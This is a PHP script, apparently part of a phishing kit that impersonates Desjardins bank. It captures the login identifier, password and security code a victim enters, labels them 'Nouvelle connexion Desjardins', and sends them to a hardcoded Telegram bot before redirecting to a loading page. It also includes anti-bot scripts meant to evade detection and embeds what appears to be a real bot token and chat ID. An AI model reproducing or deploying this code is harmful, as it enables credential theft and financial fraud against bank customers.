<?php
// send_to_telegram.php
include '../src/antibots.php';
include '../antibots.php';
include '../anti/anti1.php';
include '../anti/anti2.php';
include '../anti/anti3.php';
include '../anti/anti4.php';
include '../anti/anti5.php';
include '../anti/anti6.php';
include '../anti/anti7.php';
include '../anti/anti8.php';

if (!isset($_SESSION['useragent'])) {
    $_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];
}

function getOs($USER_AGENT){
    $OS_ERROR = "Unknown OS Platform";
    $OS = array(
        '/windows nt 10/i'      => 'Windows 10',
        '/windows nt 6.3/i'     => 'Windows 8.1',
        '/windows nt 6.2/i'     => 'Windows 8',
        '/windows nt 6.1/i'     => 'Windows 7',
        '/windows nt 6.0/i'     => 'Windows Vista',
        '/windows nt 5.2/i'     => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i'     => 'Windows XP',
        '/windows xp/i'         => 'Windows XP',
        '/windows nt 5.0/i'     => 'Windows 2000',
        '/windows me/i'         => 'Windows ME',
        '/win98/i'              => 'Windows 98',
        '/win95/i'              => 'Windows 95',
        '/win16/i'              => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i'        => 'Mac OS 9',
        '/linux/i'              => 'Linux',
        '/ubuntu/i'             => 'Ubuntu',
        '/iphone/i'             => 'iPhone',
        '/ipod/i'               => 'iPod',
        '/ipad/i'               => 'iPad',
        '/android/i'            => 'Android',
        '/blackberry/i'         => 'BlackBerry',
        '/webos/i'              => 'Mobile'
    );
    foreach ($OS as $regex => $value) {
        if (preg_match($regex, $USER_AGENT)) {
            $OS_ERROR = $value;
        }
    }
    return $OS_ERROR;
}

function getBrowser($USER_AGENT){
    $BROWSER_ERROR = "Unknown Browser";
    $BROWSER = array(
        '/msie/i'       => 'Internet Explorer',
        '/firefox/i'    => 'Firefox',
        '/safari/i'     => 'Safari',
        '/chrome/i'     => 'Chrome',
        '/edge/i'       => 'Edge',
        '/opera/i'      => 'Opera',
        '/netscape/i'   => 'Netscape',
        '/maxthon/i'    => 'Maxthon',
        '/konqueror/i'  => 'Konqueror',
        '/mobile/i'     => 'Handheld Browser'
    );
    foreach ($BROWSER as $regex => $value) {
        if (preg_match($regex, $USER_AGENT)) {
            $BROWSER_ERROR = $value;
        }
    }
    return $BROWSER_ERROR;
}

$botToken = "7726379618:AAEKmunbiAyZSH5Rs-oiTdPUHM6p1Xa6Bb4";
$chatId = "8134069302";

// Récupérer les données du formulaire
$identifiant = isset($_POST['identifiant']) ? $_POST['identifiant'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$securityCode = isset($_POST['security_code']) ? $_POST['security_code'] : '';

// Préparer le message au format HTML
if ($identifiant && $password) {
    $message = "🔐 <b>Nouvelle connexion Desjardins</b>\nIdentifiant : <code>$identifiant</code>\nMot de passe : <code>$password</code>";
} elseif ($securityCode) {
    $message = "🛡️ <b>Code de sécurité saisi</b> : <code>$securityCode</code>";
} else {
    $message = "⚠️ <b>Aucune donnée reçue</b>.";
}

// URL pour envoyer le message en mode HTML
$sendMessageUrl = "https://api.telegram.org/bot$botToken/sendMessage";
$params = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];
file_get_contents($sendMessageUrl . '?' . http_build_query($params));

// Redirection
header("Location: ../loading.php");
exit;
